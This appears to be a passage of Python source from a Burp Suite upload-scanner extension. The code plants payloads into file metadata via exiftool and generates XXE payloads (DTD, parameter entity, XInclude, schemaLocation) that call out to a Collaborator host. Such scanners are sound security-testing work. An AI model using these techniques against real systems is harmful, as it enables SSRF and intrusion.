    # However, this plugin can handle if an empty file is created so this is only for ActiveScanning modules...
    MAXIMUM_PAYLOAD_LENGTH = 131072
    EXTENSION_TO_MIME = {".gif": "image/gif",
                         ".png": "image/png",
                         #".bmp": "image/bmp",
                         ".jpeg": "image/jpeg",
                         ".tiff": "image/tiff",
                         ".pdf": "application/pdf",
                         ".zip": "application/zip",
                         ".mp4": "video/mp4"}

    # TODO feature: What happens when we make a thumbnail inside a JPEG but the thumbnail is eg. MVG or SVG?
    # Is GraphicsMagick etc. handling that properly?

    def __init__(self, enabled_formats, tool="exiftool"):
        # Basically enabled_formats tells us which are enabled in the options
        self._enabled_formats = enabled_formats
        self._tool = tool
        self.inputs = [
            # These are green 1 pixel images (1x1) in different formats
            (".gif",
             'GIF87a\x01\x00\x01\x00\x80\x01\x00\x05\xff\x00\xff\xff\xff,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'),
            (".png",
             '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\tpHYs\x00' \
             '\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18\x00\x00\x00\x07tIME\x07\xe1\x02\x02\x0f\x1b9<j\xfd\xc3\x00\x00\x00\x0c' \
             'IDAT\x08\xd7c`\xfd\xcf\x00\x00\x02\x11\x01\x05\x8c\xc0y\xe5\x00\x00\x00\x00IEND\xaeB`\x82'),
            # exiftool can't write SVG, BMP or ZIP files :(
            # it's still better than any other tool out there
            # (".bmp", 'BM\x82\x00\x00\x00\x00\x00\x00\x00~\x00\x00\x00l\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00' \
            #            '\x04\x00\x00\x00\x13\x0b\x00\x00\x13\x0b\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00BGRs\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
            #            '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
            #            '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x05\x00\x00' \
            #            '\x00\x00\x00'),
            (".jpeg",
             '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb\x00C\x00\x03\x02\x02\x03\x02\x02\x03\x03\x03' \
             '\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\n\x07\x07\x06\x08\x0c\n\x0c\x0c\x0b\n\x0b\x0b\r\x0e\x12\x10\r\x0e' \
             '\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00C\x01\x03' \
             '\x04\x04\x05\x04\x05\t\x05\x05\t\x14\r\x0b\r\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14' \
             '\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14' \
             '\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x01\x00\x01\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x14\x00\x01\x00' \
             '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\xff\xc4\x00\x15\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00' \
             '\x00\x00\x00\x00\x00\x00\x00\x07\x08\xff\xda\x00\x0c\x03\x01\x00\x02\x10\x03\x10\x00\x00\x01x6t\xff\xc4\x00\x14\x10' \
             '\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x7f\xff' \
             '\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x08\x01\x03\x01\x01' \
             '?\x01\x7f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x08\x01' \
             '\x02\x01\x01?\x01\x7f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda' \
             '\x00\x08\x01\x01\x00\x06?\x02\x7f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
             '\x00\xff\xda\x00\x08\x01\x01\x00\x01?!\x7f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\xff\x00\xff\xc4\x00' \
             '\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x08\x01\x03\x01\x01?\x10\x7f' \
             '\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x08\x01\x02\x01\x01' \
             '?\x10\x7f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x08\x01' \
             '\x01\x00\x01?\x10\x7f\xff\xd9'),
            (".tiff",
             'II*\x00\x0c\x00\x00\x00\x05\xff\x00\x00\x10\x00\xfe\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x01\x00' \
             '\x00\x00\x01\x00\x00\x00\x01\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x02\x01\x03\x00\x03\x00\x00\x00\xe2\x00\x00\x00' \
             '\x03\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x01\x03\x00\x01\x00\x00\x00\x02\x00\x00\x00\r\x01\x02\x00W\x00\x00' \
             '\x00\xe8\x00\x00\x00\x11\x01\x04\x00\x01\x00\x00\x00\x08\x00\x00\x00\x12\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x15' \
             '\x01\x03\x00\x01\x00\x00\x00\x03\x00\x00\x00\x16\x01\x03\x00\x01\x00\x00\x00@\x00\x00\x00\x17\x01\x04\x00\x01\x00\x00\x00' \
             '\x03\x00\x00\x00\x1a\x01\x05\x00\x01\x00\x00\x00\xd2\x00\x00\x00\x1b\x01\x05\x00\x01\x00\x00\x00\xda\x00\x00\x00\x1c\x01' \
             '\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00(\x01\x03\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00H\x00\x00\x00\x01' \
             '\x00\x00\x00H\x00\x00\x00\x01\x00\x00\x00\x08\x00\x08\x00\x08\x00                                                      ' \
             '                                \x00'),
            (".pdf",
             '%PDF-1.5\n%\xb5\xed\xae\xfb\n3 0 obj\n<< /Length 4 0 R\n   /Filter /FlateDecode\n>>\nstream\nx\x9c+\xe4*\xe4\xd2O4PH/V' \
             '\xd0\xaf0Up\xc9\xe7\n\x04B\x00@\x10\x05@\nendstream\nendobj\n4 0 obj\n   28\nendobj\n2 0 obj\n<<\n   /ExtGState <<\n   ' \
             '   /a0 << /CA 1 /ca 1 >>\n   >>\n   /XObject << /x5 5 0 R >>\n>>\nendobj\n6 0 obj\n<< /Type /Page\n   /Parent 1 0 R\n   ' \
             '/MediaBox [ 0 0 1 1 ]\n   /Contents 3 0 R\n   /Group <<\n      /Type /Group\n      /S /Transparency\n      /I true\n    ' \
             '  /CS /DeviceRGB\n   >>\n   /Resources 2 0 R\n>>\nendobj\n5 0 obj\n<< /Length 8 0 R\n   /Filter /FlateDecode\n   /Type /' \
             'XObject\n   /Subtype /Form\n   /BBox [ 0 0 1 1 ]\n   /Group <<\n      /Type /Group\n      /S /Transparency\n      /I tru' \
             'e\n      /CS /DeviceRGB\n   >>\n   /Resources 7 0 R\n>>\nstream\nx\x9c+\xe4*\xe4\xd2O4PH/V\xd0\xaf\xb0Tp\xc9\xe7\n\x04B' \
             '\x00@4\x05D\nendstream\nendobj\n8 0 obj\n   28\nendobj\n7 0 obj\n<<\n   /ExtGState <<\n      /a0 << /CA 1 /ca 1 >>\n   >>' \
             '\n   /XObject << /x9 9 0 R >>\n>>\nendobj\n9 0 obj\n<< /Length 10 0 R\n   /Filter /FlateDecode\n   /Type /XObject\n   /Su' \
             'btype /Image\n   /Width 1\n   /Height 1\n   /ColorSpace /DeviceRGB\n   /Interpolate true\n   /BitsPerComponent 8\n>>\nst' \
             'ream\nx\x9cc\xfd\xcf\x00\x00\x02\x10\x01\x05\nendstream\nendobj\n10 0 obj\n   11\nendobj\n1 0 obj\n<< /Type /Pages\n   /K' \
             'ids [ 6 0 R ]\n   /Count 1\n>>\nendobj\n11 0 obj\n<< /Creator (cairo 1.12.16 (http://cairographics.org))\n   /Producer (c' \
             'airo 1.12.16 (http://cairographics.org))\n>>\nendobj\n12 0 obj\n<< /Type /Catalog\n   /Pages 1 0 R\n>>\nendobj\nxref\n0 1' \
             '3\n0000000000 65535 f \n0000001093 00000 n \n0000000141 00000 n \n0000000015 00000 n \n0000000120 00000 n \n0000000451 00' \
             '000 n \n0000000241 00000 n \n0000000750 00000 n \n0000000729 00000 n \n0000000850 00000 n \n0000001071 00000 n \n00000011' \
             '58 00000 n \n0000001288 00000 n \ntrailer\n<< /Size 13\n   /Root 12 0 R\n   /Info 11 0 R\n>>\nstartxref\n1341\n%%EOF\n'),

            (".mp4",
             'eJxjYGCQSCupLMgtMDFi1GKoA9GZxfm5DAwMHGlFqakMDIxTc1MSS4D8itSOBgeG7Px/369sP7Ppg4LSNu4V3xdlej9Ydyd8zvXNN689/yjWZmc9+VN0yWw58V'
             'WZiV0l17J0b25qOXzmzdPVzI16r9PPPP//ffJNZ9V/7g9lglLX/v1SHsez+sy0b28fb8iMjZ78cJ/i2ztdHsvsM+3kzrnMCjhYKcGk+nAC0G4mTgMgaeY4i4n3'
             'k/QLtiyGhgXX7q9R/PfVhyvorfk0TuWp/6fGX728yL/lkN+Vpc36Kz33TbDSeXx8tu63ffPB+gOAJD/jPBbWi2xm/2/cs/9yIfYAigQnugTIRj7HWSyy8Wocpt'
             'v/3VoWKQjXwO04j010mcK5+ww8OxCCjPM4BG8CTWEQMkARlFzm2LsfJggi+R1ncWhcumggAAxNVHMZ53EpIquGCaoiBBm5GBiY7XLz88uAnJzcsowUIM1woTsR'
             'jBkY4ydAMAMIIQAKB5PvwIAXMAHRqZKixGwgO6YkG2wnO9xOmGkge9EBMfaCvAXWyZSWm5IJMlAhNwXNXwwMPCAsehyszSQjJacIZkZZZkoqsplhQH6+gm8q0C'
             'gFj8S8lJxUkFImrtzMvDQgQ6QsF2w2sktUUiByMilFqWlILuUpLcpRgLAZTxWXJOUA2YuKS4pTkNRMSixLNsThW5DfJjB4AGkPmAouxzBnBed8oIXpGIrBQOL/'
             'fyBpAzTVmTHFQeT/QwaV9BQGkTU6SwytGYN4eHgagAmAAUjwFDiwX2BW/HGcPcNjWgQjA2vG6+IgUIqRKC4pKUb2BZROSEaIc0HFYJiZARzLcD0syPL//4PdxI'
             'gkj6IeKm8CDJlkqBgzVB0rlGZCMpMZSd4FqKcKyfcgt9YwQBKGJBRLALEoEpZEYoPMlykuSc5Hs'
             'lcDaLQeELcB2SJA85HDghEAcQD9FQ=='.decode("base64").decode("zlib")), #AFL's small_movie.mp4
        ]
        # TODO everybody: let me know if any other exiftool features would make sense...
        # TODO feature: Use exiftool to create video files, eg. has support for R/W for M4A, M4B, M4P, M4V
        # TODO feature: Use exiftool to create video files, eg. has support for R/W for MOV, QT
        # TODO feature: Use exiftool to create other files, eg. has support for R/W for EPS, EPSF, PS
        self.exiftool_techniques = [
            # Those that don't work because none of the formats will have the payload in them after creation:
            # ("exifcomment", "-exif:comment=", []),
            # ("exifkeywords", "-exif:keywords=", []),
            # ("iptccomment", "-iptc:comment=", []),
            # ("xmpcomment", "-xmp:comment=", []),
            # ("trailer", "-trailer=", []),
            # ("photoshop_irb", "-photoshop=", []),
            # ("iccprofile", "-ICC_Profile<='", []),
            # ("miesubfiledirectory", "-mie:SubfileDirectory=", []),

            # All these below here work
            # for gif -keywords= is the same as -xmp:keywords=
            # for jpeg and tiff -keywords= is the same as -iptc:keywords=

            ("keywords", "-keywords=", [".pdf", ".mp4" ]),
            ("comment", "-comment=", [".gif", ".jpeg", ".png"]),

            ("iptckeywords", "-iptc:keywords=", [".jpeg", ".tiff"]),
            ("xmpkeywords", "-xmp:keywords=", [".gif", ".jpeg", ".pdf", ".png", ".tiff", ".mp4"]),
            ("exifImageDescription", "-exif:ImageDescription=", [".jpeg", ".tiff"]),

            # These two were only commented out because I don't think there is any use of doing all these,
            # as they are combined with all file extensions, mime types, which is always a combinatoric explosion
            # so we rather don't have too many techniques.
            # But they work:
            # ("gpsareainformation", "-gps:GPSAreaInformation=", [".jpeg", ".tiff"]),
            # ("makernotes", "-makernotes=", [".jpeg", ".tiff"]),

            ("thumbnailWithIptckeywords", "-ThumbnailImage<=", [".jpeg"]),
        ]

        self.exiftool_techniques_thumbnail = ("thumbnailWithIptckeywords", "iccprofile")
        self.exiftool_techniques_thumbnail_file = ("iptckeywords", ".jpeg")
        self.placeholder_char = "X"
        self._exiftool_works = False
        self._checked_for_exiftool = False


    def create_zip(self, files):
        if not files:
            return None
        zipcontent = BytesIO()
        # ZIP_DEFLATED could be done too, but what for?
        # in most our exploitation scenarios ZIP_STORED perfectly fits the use case
        # as the payload will be 1:1 preserved in the zip file
        zip_file = zipfile.ZipFile(zipcontent, "w", zipfile.ZIP_STORED)
        cur_char = "0"
        placeholder_to_filename_mapping = {}
        for filename, filecontent in files:
            # The python manual specifies:
            # Note: If arcname (or filename, if arcname is not given) contains a null byte, the name of the file in the archive will be truncated at the null byte.
            # Tests show that this applies for zipfile.write and zipfile.writestr
            # However, we don't want that. Therefore if it actually has a zero byte
            # we first create the zip file with placeholders and then replace it again in the....
            filename_placeholder = filename
            if "\x00" in filename:
                # Note that we have the same problem again, eg. if the filename was only of length 1
                # this results in a short placeholder that is not unique and might therefore destroy
                # the content later on. Warn and not include this file then.
                if len(filename) < 5:
                    print "WARNING: The zip file filename", repr(filename), "is too short and includes a null byte."
                    print "WARNING: This is not supported by the create_zip function. Skipping this file, it will not be " \
                          "included in the created zip file."
                    continue
                filename_placeholder = cur_char * len(filename)
                placeholder_to_filename_mapping[filename_placeholder] = filename
                cur_char = chr(ord(cur_char) + 1)
            zip_file.writestr(filename_placeholder, filecontent)
        zip_file.close()
        zipcontent.seek(0)
        c = zipcontent.read()
        zipcontent.close()
        for placeholder in placeholder_to_filename_mapping:
            # ...final file.
            c = c.replace(placeholder, placeholder_to_filename_mapping[placeholder])
        return c

    def run_command(self, command):
        # print " ".join(command)
        # os.devnull also works on Windows
        se = file(os.devnull, "w")
        so = file(os.devnull, "w")
        process = subprocess.Popen(command, stdout=so, stderr=se, shell=False)
        # Debugging:
        # process = subprocess.Popen(command, stdout=file("/tmp/stdout-test", "w"), stderr=file("/tmp/stderr-test", "w"), shell=False, close_fds=True)
        # process = subprocess.Popen(command, shell=False, close_fds=True)
        #process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False, close_fds=True)
        #print process.stderr.read()
        #print process.stdout.read()
        process.communicate()  # blocking call
        se.close()
        so.close()
        return process.returncode

    def exiftool_present(self):
        if self._checked_for_exiftool:
            return self._exiftool_works
        self._checked_for_exiftool = True

        if not re.match('^[a-zA-Z0-9 .:/_\\\-]+$', self._tool) or len(self._tool) < 3:
            # The exiftool binary name can only consist of alphanumeric characters, space and . : / \ - _
            self._exiftool_works = False
            return self._exiftool_works
        elif self._tool.startswith("/") and not os.path.isfile(self._tool):
            # Linux/macOS absolute path, but file does not exist
            self._exiftool_works = False
            return self._exiftool_works
        elif re.match('^[a-zA-Z]{1}:', self._tool) and not os.path.isfile(self._tool):
            # Windows absolute path, but file does not exist
            self._exiftool_works = False
            return self._exiftool_works
        else:
            try:
                pipe = subprocess.PIPE
                proc = subprocess.Popen([self._tool, "BOWcSqVenrEcp-non-existent-file.jpg"], shell=False, stdout=pipe, stderr=pipe)
                proc.wait()
                err = proc.stderr.read()
                if "File not found:" in err:
                    self._exiftool_works = True
                else:
                    self._exiftool_works = False
            except Exception:
                self._exiftool_works = False
        return self._exiftool_works

    def get_zip_files(self, payload_func, techniques=None):
        if not techniques or "content" in techniques:
            payload, expect = payload_func()
            yield payload, expect, "ZipFileContent", ".zip", self.create_zip([("text.txt", payload), ])
        if not techniques or "name" in techniques:
            payload, expect = payload_func()
            yield payload, expect, "ZipFileName", ".zip", self.create_zip([(payload, "filecontent"), ])

    def get_files(self, size, payload_func, formats=None):
        # Sanity check to see if programmer didn't pass a payload_func, that includes MARKER_COLLAB_URL
        payload, _ = payload_func()
        if BurpExtender.MARKER_COLLAB_URL in payload:
            print "Warning:", BurpExtender.MARKER_COLLAB_URL, "found in payload for BackdooredFile, " \
                  "but this payload can not be altered after it is injected into a binary file format! Payload:", repr(payload)

        # The formats parameter specifies the formats the *module* wants to send
        # The self._enabled_formats specifies the user enabled in the UI
        # Make sure we only take the intersection between what the module wants and what is enabled in the UI
        if formats:
            formats = set(formats) & set(self._enabled_formats)
        else:
            formats = self._enabled_formats
        # .zip stuff
        if ".zip" in formats:
            for payload, expect, name, ext, c in self.get_zip_files(payload_func):
                yield payload, expect, name, ext, c
        # Exiftool stuff
        for payload, expect, name, ext, c in self.get_exiftool_images(payload_func, size, formats):
            yield payload, expect, name, ext, c

    def get_exiftool_images(self, payload_func, size, formats, techniques=None):
        # with a payload placeholder of the same length we make sure that we won't have
        # any encoding issues on the command line with exiftool. We replace it later
        # with the actual payload. This is fine as long as we handle metadata
        # AFAIK there is no format that does checksums over metadata,
        # but remember, PNG does over IDAT chunks, but we're fine as long as we don't touch IDAT
        if not self.exiftool_present():
            return
        if not techniques:
            techniques = self.exiftool_techniques
        thumb_fd, thumb_path = tempfile.mkstemp(suffix=self.exiftool_techniques_thumbnail_file[1])
        os.close(thumb_fd)
        for ext, content in self.inputs:
            # first, figure out if the caller wants this format (eg. .pdf) at all
            if formats and ext not in formats:
                continue
            # then resize the images
            # TODO feature: Is there a possibility that we could maybe resize a picture first,
            # then convert it to a PDF so the PDF has the right size?
            # If not: use a larger default pdf
            if not ext == ".pdf" and not ext == ".mp4":
                x = ImageHelpers.new_image(size[0], size[1], ext[1:])
                if x:
                    content = x
                else:
                    w = "Warning: ImageIO was not able to resize image of type '" + ext + "', using non-resized image "
                    w += "(tiff image support is supposed to be coming in JDK 1.9)"
                    print w

            # first handle the exiftool_techniques
            m, input_path = tempfile.mkstemp(suffix=ext)
            os.close(m)
            f = file(input_path, "wb")
            f.write(content)
            f.flush()
            f.close()
            # print "content", repr(content)
            for name, cmd_args, supported_types in techniques:
                if ext in supported_types:
                    cmd = [self._tool, ]
                    payload, expect = payload_func()
                    if len(payload) < BackdooredFile.MINIMUM_PAYLOAD_LENGTH:
                        print "Warning: Can not produce payloads with size smaller than {}, as the placeholder " \
                              "for exiftool would not be unique enough".format(BackdooredFile.MINIMUM_PAYLOAD_LENGTH)
                        print "Warning: Not creating such files"
                        return
                    payload_placeholder = self.placeholder_char * len(payload)
                    if name in self.exiftool_techniques_thumbnail:
                        cmd.append(cmd_args + thumb_path)
                    else:
                        cmd.append(cmd_args + payload_placeholder)
                    # cmd.append("-v")
                    cmd.append("-o")
                    m, output_path = tempfile.mkstemp(suffix=ext)
                    os.close(m)
                    try:
                        os.remove(output_path)
                    except OSError:
                        # Only happens on Windows usually but works anyway
                        pass
                    cmd.append(output_path)
                    cmd.append(input_path)
                    # print "output file exists:", os.path.isfile(output_path)
                    # print "input file exists:", os.path.isfile(input_path)
                    # print "input file contents:", repr(file(input_path, "rb").read())
                    self.run_command(cmd)
                    if os.path.isfile(output_path):
                        new_content = file(output_path, "rb").read()
                        try:
                            os.remove(output_path)
                        except OSError:
                            # Only happens on Windows usually but works anyway
                            pass
                        if name == self.exiftool_techniques_thumbnail_file[0] and ext == \
                                self.exiftool_techniques_thumbnail_file[1]:
                            # save thumbnail we need later for thumbnail
                            # this little hack works as long as payload_func always
                            # returns the same length of payload. Otherwise that might
                            # not work as we might only have 5 char placeholder in the thumbnail
                            # but need 6 for the next payload or such...
                            f = file(thumb_path, "wb")
                            f.write(new_content)
                            f.flush()
                            f.close()
                        if name in self.exiftool_techniques_thumbnail:
                            # If we created a file with a thumbnail and the thumbnail has a metadata field with the payload,
                            # why not just replace the entire thumbnail image with the payload as well?
                            # Imagine if a software parses the thumbnail image and is vulnerable to ghostscript or something
                            thumbnail_image_cont = file(thumb_path, "r").read()
                            if thumbnail_image_cont in new_content:
                                if len(payload) < len(thumbnail_image_cont):
                                    padding = len(thumbnail_image_cont) - len(payload)
                                    padded_payload = payload + " " * padding
                                    c = new_content.replace(thumbnail_image_cont, padded_payload)
                                    if payload in c:
                                        yield payload, expect, "Pa" + name, ext, c
                        if payload_placeholder in new_content:
                            c = new_content.replace(payload_placeholder, payload)
                            if payload in c:
                                # print "Successfully produced image file with payload in the following metadata:", name, ext
                                yield payload, expect, name, ext, c
                        else:
                            print "Warning: Payload missing. IPTC:Keywords has length limit of 64. " \
                                  "Technique: {}, File type: {}, Payload length: {}, Payload start: {}" \
                                  "".format(name, ext, len(payload_placeholder), repr(payload[:100]))
                            # print "Content:", repr(new_content)
                    else:
                        print "Error: The following image could not be created (exiftool didn't create a file):", name, ext
            try:
                os.remove(input_path)
            except OSError:
                # Only happens on Windows usually but works anyway
                pass
            # handle the special cases last
            # TODO feature: test if this works with ImageIO from Java 1.9
            # If the 86 spaces are still in the tiff format when resized with ImageIO
            # yield one file with those spaces replaced, but only if the payload length is smaller than those spaces
            # we do this last, so if this does not apply, it interferes less with the implementation in InsertionPointProviderForActiveScan
            if ext == ".tiff" and " " * 86 in content:
                payload, expect = payload_func()
                if len(payload) <= 86:
                    p = payload + " " * (86 - len(payload))
                    c = content.replace(" " * 86, p)
                    yield payload, expect, "tiffFilepath", ext, c
        try:
            os.remove(thumb_path)
        except OSError:
            # Only happens on Windows usually but works anyway
            pass


class Xxe(object):
    # TODO: Unsure if these techniques are fine... See e.g. slide 29 on https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf
    @staticmethod
    def get_root_tag_techniques(root_tag, new_root_tag):
        techniques = {'Dtd': [
            (root_tag, new_root_tag + '<!DOCTYPE root PUBLIC "-//A/B/EN" "' + BurpExtender.MARKER_COLLAB_URL + 'x.dtd">')],
                      'Stylesheet': [
                          (root_tag,
                           new_root_tag + '<?xml-stylesheet type="text/xml" href="' + BurpExtender.MARKER_COLLAB_URL + 'x.xsl"?>')],
                      'ParameterEntity': [
                          (root_tag,
                           new_root_tag + '<!DOCTYPE root [ <!ENTITY % other SYSTEM "' + BurpExtender.MARKER_COLLAB_URL + 'x"> %other; ]>')]}
        return techniques

    @staticmethod
    def get_tag_techniques(root_tag, new_root_tag, orig, tagname):
        techniques = {
            'Entity': [(root_tag, new_root_tag + '<!DOCTYPE root [ <!ENTITY xxe SYSTEM "' + BurpExtender.MARKER_COLLAB_URL + 'x"> ]>'),
            (orig, '<' + tagname + '>&xxe;</' + tagname + '>')],
            'Xinclude': [(root_tag, new_root_tag),
                         (orig,
                          '<' + tagname + ' xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="' + BurpExtender.MARKER_COLLAB_URL + '" /></' + tagname + '>')
                         ],
            'Schemalocation': [(root_tag, new_root_tag),
                               (orig,
                                '<' + tagname + ' xmlns="' + BurpExtender.MARKER_COLLAB_URL + '" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="' + BurpExtender.MARKER_COLLAB_URL + ' ' + BurpExtender.MARKER_COLLAB_URL + 'x.xsd"></' + tagname + '>')
                               ]}
        # TODO feature: Unsure about these, if this works when we redefine
        # the tag to include XInclude or if a random tag such as <x> inside
        # having these definitions would be better...?
        return techniques

    @staticmethod
    def get_payloads(xml, root_tag, orig_tag, tagname):
        techniques = Xxe.get_root_tag_techniques(root_tag, root_tag)
        techniques.update(Xxe.get_tag_techniques(root_tag, root_tag, orig_tag, tagname))
        for name in techniques:
            payload_for_message = []
            new_xml = xml
            all_markers_found = True
            for marker, replace_str in techniques[name]:
                if marker in new_xml:
                    new_xml = new_xml.replace(marker, replace_str)
                    payload_for_message.append(replace_str)
                else:
                    # if not all markers are in there, go to the next technique
                    all_markers_found = False
                    break
            if all_markers_found:
                yield " [...] ".join(payload_for_message), name, new_xml


class XxeXmp(Xxe):
    """A rather hackish class to reuse the code from BackdooredFile to do XXE in XMP metadata"""

    def __init__(self, enabled_formats, exiftool, width, height, marker_orig_ext, protocols, file_start, http_req_func):
        self._enabled_formats = enabled_formats
        self._image_exiftool = exiftool
        self._image_width = width
        self._image_height = height
        self._marker_orig_ext = marker_orig_ext
        self._protocols = protocols
        self._file_start = file_start
        self._make_http_request = http_req_func

        self.xmp_start = "<?xpacket"
        self.xmp_end = "</x:xmpmeta>"
        self.xpacket_end = "?>"

        self._tag_name = "pdf:Keywords"

        self._placeholder = "AB" * 200  # 400 chars

    def _gen_payload(self):
        return self._placeholder, ""

    def _create_files(self, formats):
        # A little hackery to get the BackdooredFile class to create xmp files for us...
        t = [("xmpkeywords", "-xmp:keywords=", formats)]
        bf = BackdooredFile(self._enabled_formats, self._image_exiftool)
        size = (self._image_width, self._image_height)
        for _, _, _, ext, content in bf.get_exiftool_images(self._gen_payload, size, formats, t):
            mime = BackdooredFile.EXTENSION_TO_MIME[ext]
            types = {
                ('', self._marker_orig_ext, ''),
                ('', self._marker_orig_ext, mime),
                ('', ext, ''),
                ('', ext, mime),
            }
            yield types, ext, content

    def do_collaborator_tests(self, injector, burp_colab, formats):
        colab_tests = []
        for types, ext, content in self._create_files(formats):
            old_xmp = self._get_xmp(content)
            if old_xmp:
                for payload, name, new_xmp in self._create_attack(old_xmp):
                    basename = self._file_start + "XxeXmp" + name
                    title = "XML external entity injection" # via " + ext[1:].upper() + " XMP"
                    desc = 'XXE through injection of a {} payload in the XMP metadata of a {} file. The server parsed ' \
                           'the code {} which resulted in a SSRF. <br>'.format(name, ext[1:].upper(), cgi.escape(payload))
                    issue = CustomScanIssue([injector.get_brr()], title, desc, "Firm", "High")
                    c = self._send_collab(injector, burp_colab, types, basename, content, old_xmp, new_xmp, issue)
                    colab_tests.extend(c)
            else:
                print "Error: No XMP in file:", repr(content)
        return colab_tests

    def _fix_length(self, xmp, length):
        # to fix the length we simply change the self._tag_name tag to include more/less data
        if len(xmp) < length:
            # In this case the self._tag_name was replaced and does not include self._placeholder anymore
            # Let's put parts of it in there again
            diff = length - len(xmp)
            end_tag = "</" + self._tag_name + ">"
            xmp = xmp.replace(end_tag, self._placeholder[:diff] + end_tag)
        elif len(xmp) > length:
            # In this case the self._tag_name still includes self._placeholder, therefore we can just
            # trim self._placeholder down to a smaller size
            diff = len(xmp) - length
            new_placeholder_size = len(self._placeholder) - diff
            xmp = xmp.replace(self._placeholder, self._placeholder[:new_placeholder_size])
        return xmp

    def _send_collab(self, injector, burp_colab, all_types, basename, content, old_xmp, new_xmp, issue):
        # A modified version of _send_burp_collaborator because we need to fix the length of the xmp
        # after we inject the collaborator URL
        colab_tests = []
        types = injector.get_types(all_types)
        i = 0
        for prefix, ext, mime_type in types:
            for prot in self._protocols:
                colab_url = burp_colab.generate_payload(True)
                current_new_xmp = new_xmp.replace(BurpExtender.MARKER_COLLAB_URL, prot + colab_url + "/")
                # as we are injecting into metadata of image files
                # old_xmp and new_xmp need to have the same length
                current_new_xmp = self._fix_length(current_new_xmp, len(old_xmp))
                new_content = content.replace(old_xmp, current_new_xmp)
                filename = prefix + basename + str(i) + ext
                req = injector.get_request(filename, new_content, content_type=mime_type)
                i += 1
                if req:
                    urr = self._make_http_request(injector, req, redownload_filename=filename)
                    if urr:
                        colab_tests.append(ColabTest(colab_url, urr, issue))
        return colab_tests

    def _create_attack(self, xmp):
        xpacket = FloydsHelpers.between_markers(xmp, self.xmp_start, self.xpacket_end, with_markers=True)
        orig_tag = "<" + self._tag_name + ">" + self._placeholder + "</" + self._tag_name + ">"
        for message, name, xmp_xml in Xxe.get_payloads(xmp, xpacket, orig_tag, self._tag_name):
            yield message, name, xmp_xml

    def _get_xmp(self, content):
        return FloydsHelpers.between_markers(content, self.xmp_start, self.xmp_end, with_markers=True)


class XxeOfficeDoc(Xxe):
    # TODO feature: Look into office file uploads again, it feels like we are not covering enough and there should be more...
    # YES: https://github.com/idiom/activemime-format/blob/master/amime.py
    # and https://msdn.microsoft.com/en-us/library/dd942138.aspx

    EXTENSION_TO_MIME = {".docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                         ".xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                        }

    def __init__(self, enabled_formats):
        self._enabled_formats = enabled_formats
        # just a docx/xlsx document with a capital "A"
        # when unzipped (the docx) looks as following (only files)
        # [Content_Types].xml
        # _rels/.rels
        # docProps/app.xml
        # docProps/core.xml
        # word/_rels/document.xml.rels
        # word/document.xml
        # word/endnotes.xml
        # word/fontTable.xml
        # word/footnotes.xml
        # word/settings.xml
        # word/styles.xml
        # word/theme/theme1.xml
